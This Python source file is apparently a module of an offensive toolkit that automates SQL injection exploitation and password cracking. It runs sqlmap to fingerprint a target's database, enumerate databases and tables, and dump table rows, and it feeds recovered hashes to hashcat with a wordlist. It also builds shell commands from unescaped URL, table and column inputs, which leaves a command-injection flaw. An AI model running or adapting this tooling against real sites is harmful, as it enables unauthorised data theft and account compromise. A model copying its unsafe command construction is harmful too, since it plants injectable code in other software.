#!/usr/bin/env python3
"""
Database Expert - Advanced database operations
SQL injection exploitation, hash cracking, database manipulation
"""

import asyncio
import json
import re
import tempfile
from typing import Dict, List, Any, Optional
from pathlib import Path

from ..core.config import TacticalConfig
from ..core.async_executor import AsyncExecutor


class DatabaseExpert:
    """
    Advanced database operations and exploitation
    Tools: SQLMap (injection), Hashcat (cracking), custom manipulation
    """
    
    def __init__(self):
        """Initialize database expert"""
        self.config = TacticalConfig
        self.executor = AsyncExecutor()
    
    async def detect_database(
        self,
        target_url: str
    ) -> Dict[str, Any]:
        """
        Detect database type and extract schema
        
        Args:
            target_url: Target URL with potential SQL injection
            
        Returns:
            Dictionary with database information
        """
        has_sqlmap = await self.executor.check_tool_available('sqlmap')
        
        if not has_sqlmap:
            return {'error': 'SQLMap not available'}
        
        # Detection command (safe, no exploitation)
        command = f"sqlmap -u '{target_url}' --batch --banner --current-db --threads=3"
        
        stdout, stderr, returncode = await self.executor.run_command(
            command,
            timeout=120
        )
        
        result = {
            'target': target_url,
            'dbms': None,
            'version': None,
            'current_database': None,
            'vulnerable': False
        }
        
        # Parse output
        lines = stdout.split('\n')
        
        for line in lines:
            line_lower = line.lower()
            
            # Check vulnerability
            if 'vulnerable' in line_lower and 'parameter' in line_lower:
                result['vulnerable'] = True
            
            # Extract DBMS
            if 'back-end dbms:' in line_lower:
                result['dbms'] = line.split(':')[-1].strip()
            
            # Extract version/banner
            if 'banner:' in line_lower:
                result['version'] = line.split(':')[-1].strip()
            
            # Extract current database
            if 'current database:' in line_lower:
                result['current_database'] = line.split(':')[-1].strip()
        
        return result
    
    async def extract_data(
        self,
        target_url: str,
        table: str,
        columns: Optional[List[str]] = None,
        database: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Extract data from database via SQL injection
        
        Args:
            target_url: Target URL
            table: Table name to extract
            columns: Specific columns (default: all)
            database: Database name
            
        Returns:
            Dictionary with extracted data
        """
        has_sqlmap = await self.executor.check_tool_available('sqlmap')
        
        if not has_sqlmap:
            return {'error': 'SQLMap not available'}
        
        # Build command
        command = f"sqlmap -u '{target_url}' --batch --dump -T {table}"
        
        if database:
            command += f" -D {database}"
        
        if columns:
            command += f" -C {','.join(columns)}"
        
        # Add limits to avoid huge dumps
        command += " --stop 100 --threads=3"
        
        stdout, stderr, returncode = await self.executor.run_command(
            command,
            timeout=300
        )
        
        # Parse results
        result = {
            'target': target_url,
            'table': table,
            'database': database,
            'columns': columns,
            'data': [],
            'row_count': 0
        }
        
        # Try to find CSV output
        csv_pattern = r'CSV file:\s*(.+\.csv)'
        csv_match = re.search(csv_pattern, stdout)
        
        if csv_match:
            csv_file = csv_match.group(1).strip()
            
            try:
                with open(csv_file, 'r') as f:
                    import csv
                    reader = csv.DictReader(f)
                    result['data'] = list(reader)[:100]  # Limit to 100 rows
                    result['row_count'] = len(result['data'])
            except Exception:
                pass
        
        return result
    
    async def crack_hashes(
        self,
        hashes: List[str],
        hash_type: str = "auto",
        wordlist: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Crack password hashes using hashcat
        
        Args:
            hashes: List of hashes to crack
            hash_type: Hash type (md5/sha1/sha256/auto)
            wordlist: Custom wordlist path
            
        Returns:
            Dictionary with cracked passwords
        """
        has_hashcat = await self.executor.check_tool_available('hashcat')
        
        if not has_hashcat:
            return {'error': 'Hashcat not available'}
        
        # Use rockyou.txt as default
        wordlist = wordlist or self.config.WORDLISTS.get('passwords')
        
        if not wordlist or not Path(wordlist).exists():
            return {'error': 'No wordlist available'}
        
        # Detect hash type
        hash_modes = {
            'md5': '0',
            'sha1': '100',
            'sha256': '1400',
            'sha512': '1700',
            'bcrypt': '3200',
            'ntlm': '1000'
        }
        
        if hash_type == 'auto':
            # Auto-detect based on length
            if hashes:
                hash_len = len(hashes[0])
                if hash_len == 32:
                    hash_type = 'md5'
                elif hash_len == 40:
                    hash_type = 'sha1'
                elif hash_len == 64:
                    hash_type = 'sha256'
                else:
                    hash_type = 'md5'  # Default
        
        mode = hash_modes.get(hash_type, '0')
        
        # Create temp hash file
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
            f.write('\n'.join(hashes))
            hash_file = f.name
        
        try:
            # Hashcat command
            command = (
                f"hashcat -m {mode} {hash_file} {wordlist} "
                f"--potfile-disable --quiet --force -O"
            )
            
            stdout, stderr, returncode = await self.executor.run_command(
                command,
                timeout=300
            )
            
            # Parse results
            cracked = {}
            
            for line in stdout.split('\n'):
                if ':' in line:
                    parts = line.split(':', 1)
                    if len(parts) == 2:
                        hash_val = parts[0].strip()
                        password = parts[1].strip()
                        cracked[hash_val] = password
            
            return {
                'hash_type': hash_type,
                'total_hashes': len(hashes),
                'cracked_count': len(cracked),
                'success_rate': f"{(len(cracked)/len(hashes)*100):.1f}%" if hashes else "0%",
                'cracked': cracked
            }
        
        finally:
            # Cleanup
            Path(hash_file).unlink(missing_ok=True)
    
    async def enumerate_databases(
        self,
        target_url: str
    ) -> Dict[str, Any]:
        """
        Enumerate all databases on the server
        
        Args:
            target_url: Target URL with SQL injection
            
        Returns:
            Dictionary with database list
        """
        has_sqlmap = await self.executor.check_tool_available('sqlmap')
        
        if not has_sqlmap:
            return {'error': 'SQLMap not available'}
        
        command = f"sqlmap -u '{target_url}' --batch --dbs --threads=3"
        
        stdout, stderr, returncode = await self.executor.run_command(
            command,
            timeout=120
        )
        
        # Parse database names
        databases = []
        in_db_section = False
        
        for line in stdout.split('\n'):
            if 'available databases' in line.lower():
                in_db_section = True
                continue
            
            if in_db_section:
                # Database lines usually start with [*]
                if line.strip().startswith('[*]'):
                    db_name = line.strip()[3:].strip()
                    if db_name:
                        databases.append(db_name)
                elif line.strip() and not line.startswith('['):
                    # End of database section
                    break
        
        return {
            'target': target_url,
            'databases': databases,
            'count': len(databases)
        }
    
    async def enumerate_tables(
        self,
        target_url: str,
        database: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Enumerate tables in a database
        
        Args:
            target_url: Target URL
            database: Database name (optional, uses current if not specified)
            
        Returns:
            Dictionary with table list
        """
        has_sqlmap = await self.executor.check_tool_available('sqlmap')
        
        if not has_sqlmap:
            return {'error': 'SQLMap not available'}
        
        command = f"sqlmap -u '{target_url}' --batch --tables --threads=3"
        
        if database:
            command += f" -D {database}"
        
        stdout, stderr, returncode = await self.executor.run_command(
            command,
            timeout=120
        )
        
        # Parse tables
        tables = []
        
        for line in stdout.split('\n'):
            # Table lines usually show with [*] or in a structured format
            if '[*]' in line or '|' in line:
                # Extract table name
                table_match = re.search(r'\|\s*(\w+)\s*\|', line)
                if table_match:
                    tables.append(table_match.group(1))
                elif line.strip().startswith('[*]'):
                    table_name = line.strip()[3:].strip()
                    if table_name and not any(x in table_name.lower() for x in ['database', 'table']):
                        tables.append(table_name)
        
        return {
            'target': target_url,
            'database': database or 'current',
            'tables': list(set(tables)),  # Remove duplicates
            'count': len(set(tables))
        }


if __name__ == "__main__":
    # Test the module
    async def test():
        expert = DatabaseExpert()
        
        print("Testing DatabaseExpert...")
        print("=" * 60)
        
        # Test hash cracking with sample MD5
        print("\n1. Testing hash cracking:")
        test_hashes = [
            '5f4dcc3b5aa765d61d8327deb882cf99',  # password
            '098f6bcd4621d373cade4e832627b4f6'   # test
        ]
        
        # Note: This would require hashcat and wordlist
        print(f"Would crack {len(test_hashes)} hashes")
        
        print("\n✅ Tests completed")
    
    asyncio.run(test())
